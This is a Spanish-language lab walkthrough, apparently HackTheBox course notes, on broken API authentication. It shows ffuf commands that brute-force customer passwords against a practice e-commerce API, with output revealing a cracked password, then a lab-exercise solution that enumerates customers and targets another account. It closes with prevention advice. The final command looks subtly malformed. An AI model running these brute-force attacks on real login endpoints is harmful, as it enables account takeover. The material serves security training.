
# Broken Authentication

[La autenticación](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html) es un pilar fundamental de la seguridad de las API web. Estas utilizan diversos mecanismos de autenticación para garantizar la confidencialidad de los datos. Una API se ve afectada con `Broken Authentication` si alguno de sus mecanismos de autenticación puede ser eludido o evadido.

### Restricción inadecuada de intentos excesivos de autenticación <a href="#improper-restriction-of-excessive-authentication-attempts" id="improper-restriction-of-excessive-authentication-attempts"></a>

El endpoint contra el que practicaremos es vulnerable a [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html).

#### Escenario <a href="#scenario" id="scenario"></a>

El administrador de `Inlanefreight E-Commerce Marketplace` nos ha proporcionado las credenciales `htbpentester3@hackthebox.com:HTBPentester3` y quiere que evaluemos qué vulnerabilidades de API puede explotar el usuario con sus roles asignados.

Dado que la cuenta pertenece a un cliente, utilizaremos el endpoint `/api/v1/authentication/customers/sign-in` para obtener un JWT y luego autenticarnos con él:

![Solicitud POST para /api/v1/authentication/customers/sign-in. Parámetros: Correo electrónico y contraseña. Respuesta: Se proporcionó un token web JSON (JWT).](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API2_2023_Broken_Authentication_Image_1.png)

Al invocar el endpoint `/api/v1/customers/current-user`, recuperamos la información de nuestro usuario actualmente autenticado:

![Solicitud GET para /api/v1/customers/current-user. Sin parámetros. Respuesta: Datos del cliente, incluyendo ID, nombre "HTBPentester3", correo electrónico, número de teléfono y fecha de nacimiento.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API2_2023_Broken_Authentication_Image_2.png)

El endpoint `/api/v1/roles/current-user` revela que al usuario se le asignan tres roles: `Customers_UpdateByCurrentUser`, `Customers_Get`, y `Customers_GetAll`:

![Solicitud GET para /api/v1/roles/current-user. Sin parámetros. Respuesta: Los roles de usuario incluyen "Customers\_UpdateByCurrentUser", "Customers\_Get" y "Customers\_GetAll".](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API2_2023_Broken_Authentication_Image_3.png)

`Customers_GetAll` nos permite utilizar el endpoint `/api/v1/customers`, que devuelve los registros de todos los clientes:

![Solicitud GET para /api/v1/customers. Respuesta: Lista de clientes con detalles como ID, nombre, correo electrónico, número de teléfono y fecha de nacimiento.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API2_2023_Broken_Authentication_Image_4.png)

Aunque el endpoint sufre `Broken Object Property Level Authorization` (lo cual abordaremos en la próxima sección) porque expone información confidencial sobre otros clientes, como `email`, `phoneNumber`, y `birthDate`, no nos permite directamente secuestrar ninguna otra cuenta.

Al expandir el endpoint `PATCH` `/api/v1/customers/current-user` , descubrimos que nos permite actualizar nuestros campos de información, incluida la contraseña de la cuenta:

![Solicitud PATCH para /api/v1/customers/current-user. Sin parámetros. Cuerpo de la solicitud: Actualizar los datos del cliente, incluyendo nombre, correo electrónico, número de teléfono, fecha de nacimiento y contraseña.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API2_2023_Broken_Authentication_Image_5.png)

Si proporcionamos una contraseña débil como "pass", la API rechaza la actualización, indicando que las contraseñas deben tener al menos seis caracteres:

![Solicitud de parche para /api/v1/customers/current-user. Respuesta: Error 400, la contraseña debe tener al menos 6 caracteres.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API2_2023_Broken_Authentication_Image_6.png)

El mensaje de validación proporciona información valiosa, ya que revela que la API utiliza una política de contraseñas débiles que no garantiza la seguridad criptográfica. Si intentamos configurar la contraseña como '`123456`', observaremos que la API ahora muestra el estado de éxito `true`, lo que indica que se realizó la actualización:

![Solicitud PATCH para /api/v1/customers/current-user. El cuerpo de la solicitud incluye información actualizada del cliente. Respuesta: El estado de éxito es verdadero.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API2_2023_Broken_Authentication_Image_7.png)

Dado que la API utiliza una política de contraseñas débil, es posible que otras cuentas de clientes hayan usado contraseñas criptográficamente inseguras al registrarse. Por lo tanto, realizaremos pruebas de fuerza bruta de contraseñas con `ffuf` contra los clientes.

Primero, necesitamos obtener el mensaje (de error) que devuelve el endpoint  `/api/v1/authentication/customers/sign-in` cuando se le proporcionan credenciales incorrectas, que en este caso es "`Invalid Credentials`":

![Solicitud POST para /api/v1/authentication/customers/sign-in. El cuerpo de la solicitud incluye correo electrónico y contraseña. Respuesta: Mensaje de error "Credenciales no válidas".](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API2_2023_Broken_Authentication_Image_8.png)

En lugar de atacar a los 107 clientes, el administrador de `Inlanefreight E-Commerce Marketplace` nos ha proporcionado los correos electrónicos de tres objetivos de alto valor (que debemos guardar en un archivo):

* `OlawaleJones@yandex.com`
* `IsabellaRichardson@gmail.com`
* `WenSalazar@zoho.com`

Para la lista de palabras de contraseña, usaremos [xato-net-10-million-passwords-10000](https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords-10000.txt) de [SecLists](https://github.com/danielmiessler/SecLists/tree/master)

Dado que estamos analizando dos parámetros simultáneamente (el correo electrónico y la contraseña), necesitamos usar la flag `-w` y asignar las palabras clave `EMAIL` y `PASS` a las listas de palabras de los correos electrónicos y las contraseñas de los clientes, respectivamente.&#x20;

Una vez finalizado, descubriremos que la contraseña de `IsabellaRichardson@gmail.com` es `qwerasdfzxcv`:

```shellscript
afsh4ck@kali$ ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://94.237.59.63:31874/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://94.237.59.63:31874/api/v1/authentication/customers/sign-in
 :: Wordlist         : PASS: /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt
 :: Wordlist         : EMAIL: /home/htb-ac-413848/customerEmails.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"Email": "EMAIL", "Password": "PASS"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Invalid Credentials
________________________________________________

[Status: 200, Size: 393, Words: 1, Lines: 1, Duration: 81ms]
    * EMAIL: IsabellaRichardson@gmail.com
    * PASS: qwerasdfzxcv

:: Progress: [30000/30000] :: Job [1/1] :: 1275 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```

Ahora que hemos forzado la contraseña, podemos usar el endpoint `/api/v1/authentication/customers/sign-in` con las credenciales `IsabellaRichardson@gmail.com:qwerasdfzxcv` para obtener un JWT de `Isabella` y ver toda su información confidencial en `Inlanefreight E-Commerce Marketplace`.

#### Fuerza bruta de OTP y respuestas a preguntas de seguridad <a href="#brute-forcing-otps-and-answers-of-security-questions" id="brute-forcing-otps-and-answers-of-security-questions"></a>

Las aplicaciones permiten a los usuarios restablecer sus contraseñas solicitando un `One Time Password`(`OTP`) enviado a un dispositivo propio o respondiendo a una pregunta de seguridad elegida durante el registro. Si la fuerza bruta de las contraseñas no es viable debido a políticas de contraseñas robustas, podemos intentar forzar las OTP o las respuestas a las preguntas de seguridad, siempre que tengan baja entropía o sean fáciles de adivinar (además de que no se implementa la limitación de velocidad).

#### Prevención <a href="#prevention" id="prevention"></a>

Para mitigar la  `Broken Authentication` vulnerabilidad, el endpoint `/api/v1/authentication/customers/sign-in` debe implementar una limitación de velocidad para evitar ataques de fuerza bruta. Esto se puede lograr limitando el número de intentos de inicio de sesión desde una sola dirección IP o cuenta de usuario dentro de un plazo específico.

Además, la API web debe implementar una política de contraseñas robusta para las credenciales de usuario (incluyendo clientes y proveedores) durante el registro y las actualizaciones, permitiendo únicamente contraseñas criptográficamente seguras. Esta política debe incluir:

1. `Longitud mínima de contraseña` (por ejemplo, al menos 12 caracteres)
2. `Requisitos complejos` (por ejemplo, una combinación de letras mayúsculas y minúsculas, números y caracteres especiales)
3. `Prohibición de contraseñas comunmente usadas o adivinables` (como los que se encuentran en bases de datos de contraseñas filtradas)
4. `Aplicación del historial de contraseñas` para evitar la reutilización de contraseñas recientes
5. Caducidad regular de contraseñas y cambios obligatorios

Además, el endpoint de la API web debe implementar autenticación multifactor (`MFA`) para mayor seguridad, solicitando un `OTP` antes de autenticar completamente a los usuarios.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 94.237.120.112:45582
```

#### Aprovecha otra vulnerabilidad de Broken Authentication para obtener acceso no autorizado al cliente con el correo electrónico "<MasonJenkins@ymail.com>". Obtén sus datos de pago y reportalo.

> Concéntrate en los endpoints POST /api/v1/authentication/customers/passwords/resets junto con /api/v1/authentication/customers/passwords/resets/email-otps o /api/v1/authentication/customers/passwords/resets/sms-otps.

Vamos al endpoint `/customers/sing-in` y en el request body ponemos nuestras credenciales:

```json
{
  "Email": "htbpentester3@hackthebox.com",
  "Password": "HTBPentester3"
}
```

Eso nos genera el JWT Token:

<figure><img src="/files/gsflyEkNiv0QLaaC8GAZ" alt=""><figcaption></figcaption></figure>

Y en Authorize nos autenticamos con el Token JWT.

El endpoint `/api/v1/roles/current-user` revela que al usuario se le asignan tres roles: `Customers_UpdateByCurrentUser`, `Customers_Get`, y `Customers_GetAll`:

<figure><img src="/files/iXjSJWfJiLvJK4EsoO1k" alt=""><figcaption></figcaption></figure>

### Identificar error

{% code overflow="wrap" %}

```bash
curl -X POST "http://94.237.120.112:45582/api/v1/authentication/customers/passwords/resets" \
  -H "Content-Type: application/json" \
  -d '{"email": "MasonJenkins@ymail.com"}'
  
{"StatusCode":400,"Message":"One or more errors occurred!","Errors":{"SerializerErrors":["JSON deserialization for type 'API_Attacks.Entities.Commands.ResetCustomerPasswordCommand' was missing required properties, including the following: OTP, NewPassword"]}}
```

{% endcode %}

`Customers_GetAll` nos permite utilizar el endpoint `/api/v1/customers`, que devuelve los registros de todos los clientes:

<figure><img src="/files/ZhrKRztuM1b1EqBnCCPy" alt=""><figcaption></figcaption></figure>

Cuando hacemos un curl:

```
curl -X 'GET' \
  'http://94.237.120.112:45582/api/v1/customers' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjNAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiQ3VzdG9tZXJzX1VwZGF0ZUJ5Q3VycmVudFVzZXIiLCJDdXN0b21lcnNfR2V0IiwiQ3VzdG9tZXJzX0dldEFsbCJdLCJleHAiOjE3NjY0Mjc2MjksImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.owBOSnTgdeb16y1u3-IHFqD0t4Qn7UyayQWbN70oYecGERCDLT8J0Dq1NXgqFJLzXrovnoye1jXtUGmzb47A3g'
```

Nuestro objetivo es `MasonJenkins@ymail.com`:

```
{
      "id": "53428a83-8591-4548-a553-c434ad76a61a",
      "name": "Mason Jenkins",
      "email": "MasonJenkins@ymail.com",
      "phoneNumber": "+44 7451 162707",
      "birthDate": "1985-09-16"
    }
```

Si proporcionamos una contraseña débil como "pass", la API rechaza la actualización, indicando que las contraseñas deben tener al menos seis caracteres y la edad mínima son 17 años:

<figure><img src="/files/v8YpqIX0nfwo7Wm8rqWo" alt=""><figcaption></figcaption></figure>

Usando el siguiente request body:

```json
{
  "UpdatedCustomer": {
    "Name": "string",
    "Email": "htbpentester3@hackthebox.com",
    "PhoneNumber": "5844202771052969805",
    "BirthDate": "1993-12-22",
    "Password": "123456"
  }
}
```

Vemos que la respuesta es true:

<figure><img src="/files/n3YuZjfJZIdaZQR5c1xm" alt=""><figcaption></figcaption></figure>

### Bruteforce

Primero, necesitamos obtener el mensaje (de error) que devuelve el endpoint  `/api/v1/authentication/customers/sign-in` cuando se le proporcionan credenciales incorrectas, que en este caso es "`Invalid Credentials`":

<figure><img src="/files/R81gdsQoGqANxKKE0yQj" alt=""><figcaption></figcaption></figure>

Nuestro objetivo es `MasonJenkins@ymail.com`, por lo que usaremos ffuf para encontrar su contraseña de la siguiente manera:

{% code overflow="wrap" %}

```bash
afsh4ck@kali$ ffuf -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w MasonJenkins@ymail.com:EMAIL -u http://94.237.120.112:55645/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "MasonJenkins@ymail.com", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
```

{% endcode %}
